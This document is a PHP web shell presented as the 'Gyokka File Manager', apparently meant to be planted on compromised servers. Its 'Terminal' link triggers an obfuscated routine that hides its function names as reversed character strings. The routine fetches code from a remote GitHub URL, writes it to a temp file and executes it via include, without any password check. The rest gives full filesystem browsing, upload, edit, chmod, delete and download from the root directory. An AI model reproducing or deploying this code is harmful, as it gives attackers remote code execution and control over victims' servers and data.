<?php

@session_start();
@ini_set("max_execution_time", 0);
@ini_set("output_buffering", 0);
@ini_set("display_errors", 0);
@ini_set("log_errors", 0);
@ini_set('error_log', 0);

$xxx = '$2y$10$eRPNzRsjVb3inxCF7wDTq.fnKrx/Yw0RKR/7Bd/CC1KphoPlMZTxa'; 

$session_timeout = 1800;
$pageSize        = 20;

if(isset($_GET['logout'])){
    unset($_SESSION['logged_in']);
    session_destroy();
    header("Location: ?");
    exit;
}

if (isset($_POST['password'])) {
    if (password_verify($_POST['password'], $xxx)) {
        setcookie('logged_in', 'true', time() + $session_timeout, '/');
        setcookie('last_activity', time(), time() + $session_timeout, '/');
        if (!isset($_COOKIE['cmd_history'])) {
            setcookie('cmd_history', json_encode([]), time() + $session_timeout, '/');
        }
        
        header("Location: ?");
        exit;
    } else {
        $error = "Password salah!";
    }
}

if (isset($_COOKIE['logged_in']) && $_COOKIE['logged_in'] === 'true') {
    $lastActivity = isset($_COOKIE['last_activity']) ? (int)$_COOKIE['last_activity'] : 0;
    
    if (time() - $lastActivity > $session_timeout) {
        setcookie('logged_in', '', time() - 3600, '/');
        setcookie('last_activity', '', time() - 3600, '/');
        setcookie('cmd_history', '', time() - 3600, '/');
        
        $error = "Sesi habis. Login ulang.";
    } else {
        setcookie('last_activity', time(), time() + $session_timeout, '/');
    }
}

if (isset($_GET['cmdsaskra'])) {
    $URlFg9 = "https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/23bin";
    $a2e    = "t"."i"."n"."i"."_"."l"."r"."u"."c";   
    $cz2    = "t"."p"."o"."t"."e"."s"."_"."l"."r"."u"."c"; 
    $g3y    = "c"."e"."x"."e"."_"."l"."r"."u"."c";   
    $gv5    = "o"."f"."n"."i"."t"."e"."g"."_"."l"."r"."u"."c"; 
    $zx2    = "r"."o"."r"."r"."e"."_"."l"."r"."u"."c"; 
    $hte2   = "e"."s"."o"."l"."c"."_"."l"."r"."u"."c"; 
    $rwg3   = "m"."a"."n"."p"."m"."e"."t";             
    $dd2    = "n"."e"."p"."o"."f";                    
    $dsa1   = "e"."t"."i"."r"."w"."f";               
    $dsfa1  = "e"."s"."o"."l"."c"."f";             
    $gr14   = "k"."n"."i"."l"."n"."u";               
    $fzc = "e"."d"."u"."l"."c"."n"."i";   
    $gyk = strrev($a2e)($URlFg9);
    strrev($cz2)($gyk, CURLOPT_RETURNTRANSFER, true);
    strrev($cz2)($gyk, CURLOPT_FOLLOWLOCATION, true);
    $FlDtX = strrev($g3y)($gyk);
    $HtStT = strrev($gv5)($gyk, CURLINFO_HTTP_CODE);
    $CuErr = strrev($zx2)($gyk);
    strrev($hte2)($gyk);
    if ($FlDtX !== false && $HtStT === 200) {
        try {
            $tMpFiLe = strrev($rwg3)(sys_get_temp_dir(), 'cmd');
            if ($tMpFiLe !== false) {
                $fHnd = strrev($dd2)($tMpFiLe, 'wb');
                if ($fHnd !== false) {
                    strrev($dsa1)($fHnd, $FlDtX);
                    strrev($dsfa1)($fHnd);
                    if (strrev($fzc) === 'include') {
                        include $tMpFiLe;
                    }
                    strrev($gr14)($tMpFiLe);
                }
            }
        } catch (Exception $Xerr) {
        }
    }
}

if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true){
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Gyokka File Manager - Login</title>
        <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
        <style>
        body {
            margin:0; 
            padding:0; 
            background: linear-gradient(130deg, #1e0036 0%, #3f0040 40%, #090b1c 100%);
            font-family: 'Orbitron', sans-serif;
            color: #fff;
        }
        .login-container {
            width:320px; 
            margin:120px auto; 
            padding:20px;
            border-radius:8px;
            background: rgba(255,255,255,0.05);
            box-shadow: 0 0 30px rgba(255,0,255,0.3), 0 0 20px rgba(0,255,255,0.2);
            text-align:center;
            border: 1px solid rgba(255,255,255,0.2);
        }
        .login-container h2 {
            margin:0; 
            margin-bottom:15px; 
            font-size:1.5em;
            color:#0ff; 
            letter-spacing:2px;
        }
        .error {
            color:#f66; 
            margin-bottom:12px;
            font-weight:bold;
            text-shadow: 0 0 5px #f66;
        }
        input[type=password] {
            width:90%; 
            padding:10px; 
            border:1px solid #3cf; 
            background:#120023; 
            color:#ccc; 
            border-radius:4px;
            margin-bottom:10px;
            outline:none;
            transition:border-color .3s, box-shadow .3s;
        }
        input[type=password]:focus {
            border-color:#0ff;
            box-shadow: 0 0 10px rgba(0,255,255,0.6);
        }
        input[type=submit] {
            width:95%; 
            padding:10px; 
            border:none;
            background:#0ff; 
            color:#111; 
            font-weight:bold; 
            border-radius:4px; 
            cursor:pointer;
            transition: background .3s;
        }
        input[type=submit]:hover {
            background:#0cc;
        }
        </style>
    </head>
    <body>
    <div class="login-container">
      <h2>LOGIN</h2>
      <?php if(!empty($error)) echo '<div class="error">'.$error.'</div>';?>
      <form method="post">
        <input type="password" name="password" placeholder="Password..." required>
        <input type="submit" value="LOGIN">
      </form>
    </div>
    </body>
    </html>
    <?php
    exit;
}

$isWindows   = (DIRECTORY_SEPARATOR === '\\');
$rootAllowed = $isWindows ? '' : '/';

$basePath = dirname(__FILE__);
if(isset($_REQUEST['path'])){
    $temp = @realpath($_REQUEST['path']);
    if($temp && @is_dir($temp)){
        $basePath = $temp;
    }
}

function ts($d) {
    return rtrim($d, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
}
function ds($p) {
    return is_dir($p);
}
function fm($b) {
    return $b ? scandir($b) : array();
}
function del($t){
    if(is_dir($t)){
        $x = scandir($t);
        foreach($x as $y){
            if($y==='.'||$y==='..') continue;
            del($t.DIRECTORY_SEPARATOR.$y);
        }
        @rmdir($t);
    } else {
        @unlink($t);
    }
}
function fs($s){
    if($s<1024) return $s.' B';
    if($s<1048576) return round($s/1024,2).' KB';
    if($s<1073741824) return round($s/1048576,2).' MB';
    return round($s/1073741824,2).' GB';
}
function getPermOctal($path){
    $perm=@fileperms($path);
    if($perm===false) return '????';
    $mode=$perm & 0x0FFF;
    return sprintf("%04o", $mode);
}
function octalToSymbolic($octal){
    $val  = octdec($octal);
    $slot = array("r","w","x","r","w","x","r","w","x");
    $res  = "";
    for($i=0;$i<9;$i++){
        $mask=1<<(8-$i);
        $res.=($val & $mask)?$slot[$i]:"-";
    }
    return $res;
}
function getModified($path){
    $t=@filemtime($path);
    if(!$t) return '-';
    return date("Y-m-d H:i:s",$t);
}
function getFileIcon($name,$isDir){
    if($isDir) return '<span style="color:#0f8;">[DIR]</span>';
    $ext=strtolower(pathinfo($name,PATHINFO_EXTENSION));
    switch($ext){
        case 'jpg': case 'jpeg': case 'png': case 'gif': return '🖼';
        case 'zip': case 'rar': case '7z': return '📦';
        case 'mp3': case 'wav': case 'ogg':return '🎵';
        case 'mp4': case 'mov': case 'avi':return '🎞';
        case 'pdf': return '📄';
        default:     return '📄';
    }
}

if(isset($_POST['action'])){
    switch($_POST['action']){
        case 'upload':
            if(!empty($_FILES['upload_files']['name'][0])){
                foreach($_FILES['upload_files']['name'] as $i=>$n){
                    $tmp=$_FILES['upload_files']['tmp_name'][$i];
                    if($tmp){
                        @move_uploaded_file($tmp, ts($basePath).$n);
                    }
                }
            }
            break;

        case 'mkdir':
            $f=trim($_POST['folder_name']);
            if($f){
                @mkdir(ts($basePath).$f);
            }
            break;

        case 'create_file':
            $f=trim($_POST['filename']);
            $c=$_POST['filecontent'];
            if($f){
                @file_put_contents(ts($basePath).$f,$c);
            }
            break;

        case 'rename':
            $o=$_POST['old_name'];
            $n=$_POST['new_name'];
            if($o && $n){
                $oldFull=@realpath(ts($basePath).$o);
                $newFull=ts($basePath).$n;
                if($oldFull && strpos($oldFull,$rootAllowed)===0){
                    @rename($oldFull,$newFull);
                }
            }
            break;

        case 'delete':
            $t=$_POST['target'];
            if($t){
                $targetFull=@realpath(ts($basePath).$t);
                if($targetFull && strpos($targetFull,$rootAllowed)===0){
                    del($targetFull);
                }
            }
            break;

        case 'edit_file_save':
            $e=$_POST['edit_target'];
            $c=$_POST['new_content'];
            $r=@realpath($e);
            if($r && is_file($r) && strpos($r,$rootAllowed)===0){
                @file_put_contents($r,$c);
            }
            break;

        case 'chmod':
            $t=$_POST['target'];
            $perm=$_POST['perm'];
            if($t!=='' && $perm!==''){
                $targetFull=@realpath(ts($basePath).$t);
                if($targetFull && strpos($targetFull,$rootAllowed)===0){
                    @chmod($targetFull, octdec($perm));
                }
            }
            break;
    }
    header("Location: ?path=".urlencode($basePath));
    exit;
}

// DOWNLOAD
if(isset($_GET['download'])){
    $f=@realpath($_GET['download']);
    if($f && is_file($f) && strpos($f,$rootAllowed)===0){
        header('Content-Disposition: attachment; filename="'.basename($f).'"');
        header('Content-Length: '.@filesize($f));
        @readfile($f);
        exit;
    }
}

// EDIT FILE
$edit_file_mode=false;
$edit_file_path='';
$edit_file_content='';
$aceMode='ace/mode/text';

if(isset($_GET['edit'])){
    $et=@realpath($_GET['edit']);
    if($et && is_file($et) && strpos($et,$rootAllowed)===0){
        $edit_file_mode=true;
        $edit_file_path=$et;
        $edit_file_content=@file_get_contents($et);
        $ext=strtolower(pathinfo($et,PATHINFO_EXTENSION));
        switch($ext){
            case 'php':  $aceMode='ace/mode/php';break;
            case 'js':   $aceMode='ace/mode/javascript';break;
            case 'css':  $aceMode='ace/mode/css';break;
            case 'html': $aceMode='ace/mode/html';break;
            case 'htm':  $aceMode='ace/mode/html';break;
            case 'json': $aceMode='ace/mode/json';break;
            case 'xml':  $aceMode='ace/mode/xml';break;
            default:     $aceMode='ace/mode/text';break;
        }
    }
}

// FILTERING & SORT
$allFiles=fm($basePath);
$query=isset($_GET['q'])?trim($_GET['q']):'';
$filtered=array();
foreach($allFiles as $f){
    if($f==='.'||$f==='..') continue;
    if($query===''){
        $filtered[]=$f;
    } else {
        if(stripos($f,$query)!==false){
            $filtered[]=$f;
        }
    }
}
$sort=isset($_GET['sort'])?$_GET['sort']:'name';
function cmpName($a,$b){return strcasecmp($a,$b);}
function cmpSize($a,$b){
    global $basePath;
    $fa=ts($basePath).$a; 
    $fb=ts($basePath).$b;
    $sa=@is_file($fa)?@filesize($fa):0;
    $sb=@is_file($fb)?@filesize($fb):0;
    return $sa-$sb;
}
function cmpTime($a,$b){
    global $basePath;
    $fa=ts($basePath).$a;
    $fb=ts($basePath).$b;
    $ta=@filemtime($fa);
    $tb=@filemtime($fb);
    return $ta-$tb;
}
switch($sort){
    case 'size':usort($filtered,'cmpSize');break;
    case 'time':usort($filtered,'cmpTime');break;
    default:    usort($filtered,'cmpName');
}
$totalItems = count($filtered);
$totalPages = max(1,ceil($totalItems/$pageSize));
$currentPage= isset($_GET['page'])?(int)$_GET['page']:1;
if($currentPage<1)          $currentPage=1;
if($currentPage>$totalPages)$currentPage=$totalPages;
$startIndex=($currentPage-1)*$pageSize;
$pagedFiles=array_slice($filtered,$startIndex,$pageSize);

// Breadcrumb
$realBase=@realpath($basePath);
if(!$realBase) $realBase=$rootAllowed;

$breadcrumbList=array();
if($isWindows){
    $parts=@preg_split('@[\\\\/]+@',$realBase);
    $tmpPath='';
    if(isset($parts[0]) && strpos($parts[0],':')!==false){
        $tmpPath=$parts[0];
        $breadcrumbList[]=array('name'=>$parts[0],'path'=>$tmpPath);
        array_shift($parts);
    }
    foreach($parts as $seg){
        if($seg==='') continue;
        if($tmpPath===''){
            $tmpPath=$seg;
        }else{
            $tmpPath=rtrim($tmpPath,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$seg;
        }
        $breadcrumbList[]=array('name'=>$seg,'path'=>$tmpPath);
    }
} else {
    $breadcrumbList[]=array('name'=>'/','path'=>'/');
    $trimmed=ltrim($realBase,'/');
    $parts=explode('/',$trimmed);
    $accum='';
    foreach($parts as $seg){
        if($seg==='') continue;
        $accum.='/'.$seg;
        $breadcrumbList[]=array('name'=>$seg,'path'=>$accum);
    }
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Gyokka File Manager</title>
<!-- Font Futuristik -->
<link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
<style>
body {
  margin:0;
  padding:0;
  /* Latar belakang lebih futuristik */
  background: linear-gradient(120deg, #000428 0%, #3b074c 50%, #060a32 100%);
  color:#eee;
  font-family:'Orbitron',sans-serif;
  overflow-x:hidden;
}
header {
  background:rgba(0,0,0,0.7);
  padding:15px 20px;
  border-bottom:2px solid #0ff;
  display:flex;
  justify-content:space-between;
  align-items:center;
  box-shadow: 0 0 20px rgba(0,255,255,0.2);
}
header h1 {
  margin:0;
  font-size:1.3em;
  color:#0ff;
  text-transform:uppercase;
  letter-spacing:2px;
  text-shadow:0 0 5px #0ff;
}
.logout a {
  color:#0ff;
  text-decoration:none;
  border:1px solid #0ff;
  padding:6px 12px;
  border-radius:4px;
  transition:background .3s ease,color .3s ease,box-shadow .3s;
}
.logout a:hover {
  background:#0ff;
  color:#1c1c1c;
  box-shadow: 0 0 15px rgba(0,255,255,0.8);
}
.container {
  padding:20px;
}
.breadcrumbs {
  background:rgba(255,255,255,0.08);
  padding:8px;
  border:1px solid #0ff;
  border-radius:6px;
  margin-bottom:15px;
  overflow:auto;
  font-size:0.95em;
  box-shadow:0 0 10px rgba(0,255,255,0.2);
}
.breadcrumbs a {
  text-decoration:none;
  color:#0ff;
  margin-right:5px;
  transition: color .3s;
}
.breadcrumbs a:hover {
  color:#fff;
}
.breadcrumbs .sep {
  color:#fff;
  margin-right:5px;
}

.search-box {
  margin-bottom:15px;
  display:flex;
  align-items:center;
}
.search-box input[type=text] {
  width:240px;
  padding:8px;
  border:1px solid #444;
  background:#060a32;
  color:#ccc;
  border-radius:4px;
  outline:none;
  transition:border .3s, box-shadow .3s;
}
.search-box input[type=text]:focus {
  border-color:#0ff;
  box-shadow: 0 0 8px #0ff;
}
.search-box input[type=submit] {
  background:#0ff;
  color:#111;
  border:none;
  padding:8px 16px;
  cursor:pointer;
  border-radius:4px;
  font-weight:bold;
  margin-left:6px;
  transition:background .3s ease,box-shadow .3s;
}
.search-box input[type=submit]:hover {
  background:#0cc;
  box-shadow: 0 0 10px rgba(0,255,255,0.6);
}

.menu-bar {
  margin-bottom:15px;
}
.menu-bar button {
  background:#060a32;
  color:#0ff;
  padding:10px 16px;
  margin-right:8px;
  border:1px solid #0ff;
  border-radius:4px;
  font-weight:bold;
  cursor:pointer;
  transition:background .3s ease, box-shadow .3s, color .3s;
}
.menu-bar button:hover {
  background:#0ff;
  color:#000;
  box-shadow: 0 0 15px rgba(0,255,255,0.5);
}

.table-wrap {
  overflow:auto;
  background:rgba(255,255,255,0.03);
  border:1px solid #0ff;
  border-radius:6px;
  padding:10px;
  box-shadow:0 0 15px rgba(0,255,255,0.2);
}
table {
  width:100%;
  border-collapse:collapse;
  font-size:0.95em;
  min-width:600px;
}
table th, table td {
  border-bottom:1px solid #444;
  padding:8px;
  vertical-align:middle;
}
table th {
  color:#0ff;
  text-align:left;
  background:rgba(10,10,40,0.8);
  text-shadow: 0 0 5px #0ff;
}
table td {
  color:#ccc;
}
table a {
  color:#0ff;
  text-decoration:none;
  transition: color .3s;
}
table a:hover {
  color:#fff;
  text-decoration:underline;
}
table td:nth-child(1),
table th:nth-child(1) {
  width:5%;
  text-align:center;
}

.btn {
  display:inline-block;
  padding:5px 10px;
  background:#060a32;
  color:#0ff;
  border:1px solid #0ff;
  border-radius:4px;
  font-size:0.8rem;
  cursor:pointer;
  text-decoration:none;
  margin-left:4px;
  transition: background .3s, box-shadow .3s, color .3s;
}
.btn:hover {
  background:#0ff;
  color:#000;
  box-shadow: 0 0 10px rgba(0,255,255,0.6);
}
.download { color:#8ff; }
.edit     { color:#afc; }
.del      { color:#f66; }

.file-preview img {
  max-width:80px; 
  max-height:80px;
  margin:5px; 
  border:1px solid #444;
}
.file-preview video,
.file-preview audio {
  max-width:180px;
  margin:5px;
}

.paging {
  text-align:center;
  margin:10px 0;
}
.paging a {
  display:inline-block;
  padding:6px 10px;
  margin:2px;
  background:#060a32;
  color:#0ff;
  border:1px solid #0ff;
  border-radius:4px;
  text-decoration:none;
  transition:background .3s, box-shadow .3s, color .3s;
}
.paging a:hover {
  background:#0ff;
  color:#000;
  box-shadow:0 0 10px rgba(0,255,255,0.6);
}
.paging .current {
  background:#0ff;
  color:#000;
  font-weight:bold;
  box-shadow:0 0 10px rgba(0,255,255,0.8);
}

.tab-content {
  display:none;
  background:rgba(255,255,255,0.08);
  border:1px solid #0ff;
  border-radius:6px;
  padding:15px;
  margin-bottom:20px;
  box-shadow:0 0 15px rgba(0,255,255,0.2);
}
.form-group {
  margin-bottom:12px;
}
.form-group label {
  display:block;
  font-weight:bold;
  margin-bottom:6px;
  color:#8ff;
  text-shadow:0 0 4px #0ff;
}
.form-group input[type=text],
.form-group textarea,
.form-group input[type=file] {
  width:100%;
  background:#060a32;
  border:1px solid #444;
  color:#ccc;
  border-radius:4px;
  padding:8px;
  outline:none;
  transition:border .3s, box-shadow .3s;
}
.form-group input[type=text]:focus,
.form-group textarea:focus {
  border-color:#0ff;
  box-shadow:0 0 8px #0ff;
}
.form-group input[type=submit] {
  background:#0ff;
  color:#000;
  border:none;
  padding:8px 16px;
  border-radius:4px;
  font-weight:bold;
  cursor:pointer;
  transition: background .3s, box-shadow .3s;
}
.form-group input[type=submit]:hover {
  background:#0cc;
  box-shadow:0 0 10px rgba(0,255,255,0.6);
}

.drag-area {
  border:2px dashed #0ff;
  padding:20px;
  text-align:center;
  border-radius:6px;
  margin-bottom:10px;
  color:#aaa;
  transition:background .3s ease, color .3s ease, box-shadow .3s;
}
.drag-area.hover {
  background:#060a32;
  color:#0ff;
  box-shadow:0 0 10px rgba(0,255,255,0.5);
}

/* Rename & chmod popup */
#overlay {
  display:none;
  position:fixed;
  top:0; left:0;
  width:100%; height:100%;
  background:rgba(0,0,0,0.5);
  z-index:9998;
}
#renameBox, #chmodBox {
  display:none;
  position:fixed;
  top:50%; left:50%;
  transform:translate(-50%,-50%);
  z-index:9999;
  background:rgba(10,10,40,0.9);
  border:2px solid #0ff;
  border-radius:6px;
  width:320px;
  max-width:90%;
  padding:20px;
  box-shadow:0 0 15px rgba(0,255,255,0.8);
}
#renameBox h3, #chmodBox h3 {
  margin-top:0;
  color:#0ff;
  text-transform:uppercase;
  letter-spacing:1px;
  text-shadow:0 0 5px #0ff;
}
#renameBox input[type=text], #chmodBox input[type=text] {
  width:100%;
  background:#000;
  border:1px solid #444;
  color:#fff;
  border-radius:4px;
  padding:8px;
  margin-bottom:12px;
  outline:none;
  transition:border .3s, box-shadow .3s;
}
#renameBox input[type=text]:focus, #chmodBox input[type=text]:focus {
  border-color:#0ff;
  box-shadow:0 0 8px #0ff;
}
#renameBox input[type=submit], #chmodBox input[type=submit] {
  background:#0ff;
  color:#000;
  border:none;
  padding:8px 16px;
  border-radius:4px;
  font-weight:bold;
  cursor:pointer;
  transition: background .3s, box-shadow .3s;
}
#renameBox input[type=submit]:hover, #chmodBox input[type=submit]:hover {
  background:#0cc;
  box-shadow: 0 0 10px rgba(0,255,255,0.8);
}
#renameBox button, #chmodBox button {
  background:#444;
  color:#eee;
  border:none;
  padding:8px 16px;
  border-radius:4px;
  margin-left:6px;
  cursor:pointer;
  transition:background .3s, box-shadow .3s, color .3s;
}
#renameBox button:hover, #chmodBox button:hover {
  background:#666;
  color:#fff;
}

/* Footer */
.footer {
  text-align:center;
  margin:30px 0 15px 0;
  color:#aaa;
  font-size:0.85em;
}
.footer span {
  color:#0ff;
}
</style>
<!-- ACE Editor -->
<script src="https://cdn.jsdelivr.net/npm/ace-builds@1.23.1/src-min-noconflict/ace.js"></script>
</head>
<body>

<header>
  <h1>Gyokka File Manager</h1>
  <div class="logout"><a href="?logout=true">Logout</a></div>
</header>

<div class="container">

  <div class="breadcrumbs">
    <?php
    $count = count($breadcrumbList);
    for($i=0;$i<$count;$i++){
      $b=$breadcrumbList[$i];
      $isLast=($i===$count-1);
      echo '<a href="?path=', urlencode($b['path']), '">', htmlspecialchars($b['name']), '</a>';
      if(!$isLast) echo '<span class="sep">/</span>';
    }
    ?>
  </div>

  <!-- Search -->
  <div class="search-box">
    <form method="get">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="text" name="q" placeholder="Search..." value="<?php echo htmlspecialchars($query);?>">
      <input type="submit" value="Go">
    </form>
  </div>

  <!-- Editor Mode: Tampilkan langsung (style="display:block;") jika $edit_file_mode -->
  <?php if($edit_file_mode){ ?>
  <div style="margin-bottom:20px; display:block;" id="editFileTab">
    <h3 style="color:#0ff;margin-top:0;text-shadow:0 0 5px #0ff;">Edit File</h3>
    <div style="font-size:0.9em;margin-bottom:8px;">
      <?php echo htmlspecialchars($edit_file_path);?>
    </div>
    <form method="post" onsubmit="syncEditor()">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="hidden" name="action" value="edit_file_save">
      <input type="hidden" name="edit_target" value="<?php echo htmlspecialchars($edit_file_path);?>">
      <textarea id="editorContent" name="new_content" style="display:none;"><?php echo htmlspecialchars($edit_file_content);?></textarea>
      <div id="aceEditor" style="width:100%; height:400px; background:#1e242c;color:#eee;"></div>
      <input type="submit" value="Save" style="margin-top:10px;">
      <a href="?path=<?php echo urlencode($basePath);?>" class="btn" style="margin-left:10px;">Cancel</a>
    </form>
  </div>
  <script>
  var aceEditor = ace.edit("aceEditor");
  aceEditor.setTheme("ace/theme/one_dark");
  aceEditor.session.setMode("<?php echo $aceMode;?>");
  aceEditor.setValue(document.getElementById("editorContent").value, -1);
  function syncEditor(){
    document.getElementById("editorContent").value = aceEditor.getValue();
  }
  </script>
  <?php } ?>

  <!-- Menu Bar -->
  <div class="menu-bar">
    <button onclick="window.location='?'">Home</button>
    <button onclick="showTab('upload')">Upload</button>
    <button onclick="showTab('folder')">New Folder</button>
    <button onclick="showTab('file')">New File</button>
    <button onclick="goTerminal()">Terminal</button>
    <script>
      function goTerminal(){
        let url = new URL(window.location.href);
        url.searchParams.set('cmdsaskra','1');
        window.location.href = url.toString();
      }
    </script>
  </div>

  <!-- TAB UPLOAD -->
  <div id="uploadTab" class="tab-content" style="display:none;">
    <h3 style="color:#0ff;margin-top:0;text-shadow:0 0 5px #0ff;">Upload File</h3>
    <div id="dragArea" class="drag-area">
      <p>Drag & Drop file di sini</p>
      <p>atau pilih manual di bawah</p>
    </div>
    <form id="uploadForm" method="post" enctype="multipart/form-data" class="form-group">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="hidden" name="action" value="upload">
      <label>Pilih file:</label>
      <input type="file" name="upload_files[]" multiple>
      <input type="submit" value="Upload">
    </form>
  </div>

  <!-- TAB FOLDER -->
  <div id="folderTab" class="tab-content" style="display:none;">
    <h3 style="color:#0ff;margin-top:0;text-shadow:0 0 5px #0ff;">Create Folder</h3>
    <form method="post">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="hidden" name="action" value="mkdir">
      <div class="form-group">
        <label>Folder Name</label>
        <input type="text" name="folder_name" placeholder="Contoh: images">
      </div>
      <div class="form-group">
        <input type="submit" value="Create">
      </div>
    </form>
  </div>

  <!-- TAB FILE -->
  <div id="fileTab" class="tab-content" style="display:none;">
    <h3 style="color:#0ff;margin-top:0;text-shadow:0 0 5px #0ff;">Create File</h3>
    <form method="post">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="hidden" name="action" value="create_file">
      <div class="form-group">
        <label>Filename</label>
        <input type="text" name="filename" placeholder="Contoh: index.php">
      </div>
      <div class="form-group">
        <label>Content (optional)</label>
        <textarea name="filecontent" rows="4" placeholder="Boleh dikosongkan..."></textarea>
      </div>
      <div class="form-group">
        <input type="submit" value="Create">
      </div>
    </form>
  </div>

  <!-- RENAME & CHMOD BOX -->
  <div id="overlay"></div>
  <div id="renameBox">
    <h3>Rename</h3>
    <form method="post">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="hidden" name="action" value="rename">
      <input type="hidden" name="old_name" id="renameOld">
      <input type="text" name="new_name" id="renameNew">
      <br>
      <input type="submit" value="OK">
      <button type="button" onclick="closeRenameBox()">Cancel</button>
    </form>
  </div>
  <div id="chmodBox">
    <h3>CHMOD</h3>
    <form method="post">
      <input type="hidden" name="path" value="<?php echo htmlspecialchars($basePath);?>">
      <input type="hidden" name="action" value="chmod">
      <input type="hidden" name="target" id="chmodTarget">
      <input type="text" name="perm" id="chmodPerm" placeholder="Contoh: 0755, 0644">
      <br>
      <input type="submit" value="OK">
      <button type="button" onclick="closeChmodBox()">Cancel</button>
    </form>
  </div>

  <!-- Tabel File/Folder -->
  <div class="table-wrap">
    <table>
      <thead>
        <tr>
          <th>Icon</th>
          <th>
            <a href="?<?php
               $params=$_GET;
               $params['sort']='name';
               $params['page']=1;
               echo http_build_query($params);
            ?>">Name</a>
          </th>
          <th>Type</th>
          <th style="text-align:right;">
            <a href="?<?php
               $params=$_GET;
               $params['sort']='size';
               $params['page']=1;
               echo http_build_query($params);
            ?>">Size</a>
          </th>
          <th style="text-align:center;">Octal</th>
          <th style="text-align:center;">Symbol</th>
          <th style="text-align:center;">
            <a href="?<?php
               $params=$_GET;
               $params['sort']='time';
               $params['page']=1;
               echo http_build_query($params);
            ?>">Modified</a>
          </th>
          <th style="text-align:right;">Action</th>
        </tr>
      </thead>
      <tbody>
      <?php
      // Tombol Up
      $parent=dirname($basePath);
      if($parent && $parent!=$basePath){
        echo "<tr>
                <td>📁</td>
                <td><a href='?path=".urlencode($parent)."'><strong>.. (Back)</strong></a></td>
                <td>Folder</td>
                <td style='text-align:right;'>-</td>
                <td style='text-align:center;'>-</td>
                <td style='text-align:center;'>-</td>
                <td style='text-align:center;'>-</td>
                <td></td>
              </tr>";
      }

      foreach($pagedFiles as $f){
        $full=ts($basePath).$f;
        $isDir=ds($full);
        $permOct=getPermOctal($full);
        $permSym=octalToSymbolic($permOct);
        $modified=getModified($full);
        $icon=getFileIcon($f,$isDir);

        echo '<tr>';
        echo '<td style="text-align:center;">'.$icon.'</td>';
        if($isDir){
          echo '<td><a href="?path='.urlencode($full).'"><strong>'.htmlspecialchars($f).'</strong></a></td>';
          echo '<td>Folder</td>';
          echo '<td style="text-align:right;">-</td>';
        } else {
          echo '<td>'.htmlspecialchars($f);
          // Preview (Gambar, Audio, Video)
          $ext=strtolower(pathinfo($f,PATHINFO_EXTENSION));
          if(in_array($ext,array('jpg','jpeg','png','gif'))){
            echo '<div class="file-preview"><img src="'.htmlspecialchars($f).'" alt=""></div>';
          } elseif(in_array($ext,array('mp4','webm','mov','avi'))){
            echo '<div class="file-preview"><video src="'.htmlspecialchars($f).'" controls></video></div>';
          } elseif(in_array($ext,array('mp3','wav','ogg'))){
            echo '<div class="file-preview"><audio src="'.htmlspecialchars($f).'" controls></audio></div>';
          }
          echo '</td>';
          echo '<td>File</td>';
          $sz=@filesize($full);
          echo '<td style="text-align:right;">'.fs($sz).'</td>';
        }
        echo '<td style="text-align:center;">'.$permOct.'</td>';
        echo '<td style="text-align:center;">'.$permSym.'</td>';
        echo '<td style="text-align:center;">'.$modified.'</td>';

        // Aksi
        echo '<td style="text-align:right;">';
        if(!$isDir){
          // Download
          echo '<a href="?download='.urlencode($full).'" class="btn download">Download</a>';
          // Edit
          echo '<a href="?edit='.urlencode($full).'&path='.urlencode($basePath).'" class="btn edit">Edit</a>';
        }
        // Rename
        echo '<button type="button" class="btn" onclick="openRenameBox(\''.htmlspecialchars($f).'\')" style="color:#fff;">Rename</button>';
        // CHMOD
        echo '<button type="button" class="btn" onclick="openChmodBox(\''.htmlspecialchars($f).'\',\''.$permOct.'\')" style="color:#fff;">CHMOD</button>';
        // Delete
        echo '<form action="" method="post" style="display:inline;margin-left:5px;">
                <input type="hidden" name="path" value="'.htmlspecialchars($basePath).'">
                <input type="hidden" name="action" value="delete">
                <input type="hidden" name="target" value="'.htmlspecialchars($f).'">
                <input type="submit" class="btn del" value="Delete">
              </form>';
        echo '</td>';
        echo '</tr>';
      }
      ?>
      </tbody>
    </table>
  </div>

  <!-- Paging -->
  <?php if($totalPages>1){ ?>
  <div class="paging">
    <?php
    $baseLink='?'.http_build_query(array_merge($_GET,array('page'=>null)));
    for($i=1;$i<=$totalPages;$i++){
      if($i==$currentPage){
        echo '<span class="current">',$i,'</span>';
      } else {
        echo '<a href="'.$baseLink.'&page='.$i.'">'.$i.'</a>';
      }
    }
    ?>
  </div>
  <?php } ?>
</div>

<!-- Footer -->
<div class="footer">
  &copy; <span><?php echo date("Y"); ?></span> Gyokka
</div>

<script>
// Fungsi umum showTab
function showTab(tab){
  var tabs=["upload","folder","file"];
  for(var i=0;i<tabs.length;i++){
    document.getElementById(tabs[i]+"Tab").style.display="none";
  }
  var el=document.getElementById(tab+"Tab");
  if(el) el.style.display="block";
}

// Drag & Drop
var dragArea=document.getElementById('dragArea');
if(dragArea){
  var uploadForm=document.getElementById('uploadForm');
  dragArea.addEventListener('dragover',function(e){
    e.preventDefault();
    dragArea.classList.add('hover');
  });
  dragArea.addEventListener('dragleave',function(e){
    dragArea.classList.remove('hover');
  });
  dragArea.addEventListener('drop',function(e){
    e.preventDefault();
    dragArea.classList.remove('hover');
    var files=e.dataTransfer.files;
    var formData=new FormData(uploadForm);
    for(var i=0;i<files.length;i++){
      formData.append('upload_files[]',files[i]);
    }
    formData.set('action','upload');
    fetch('',{method:'POST',body:formData})
    .then(function(r){return r.text();})
    .then(function(txt){
      alert('Upload selesai!\nReload halaman.');
      location.reload();
    })
    .catch(function(err){
      console.error(err);
      alert('Gagal upload!');
    });
  });
}

